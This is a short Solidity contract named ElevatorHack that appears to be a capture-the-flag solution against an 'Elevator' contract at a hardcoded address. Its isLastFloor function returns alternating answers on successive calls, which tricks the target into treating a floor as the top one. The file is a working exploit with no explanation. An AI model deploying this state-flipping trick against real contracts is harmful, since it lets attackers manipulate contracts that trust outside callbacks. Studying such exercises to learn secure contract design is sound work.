// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface Building {
    function isLastFloor(uint floor) external returns (bool);
}

interface Elevator {

    function goTo(uint floor) external;
}

contract ElevatorHack is Building {

    bool lastReturned = true;

    function isLastFloor(uint floor) external returns (bool) {
        lastReturned = !lastReturned;
        return lastReturned;
    }

    function hack() public {
        Elevator(0x9dE86fa8e9E065af2CCB9cbDaD52C86637315924).goTo(10);
    }
}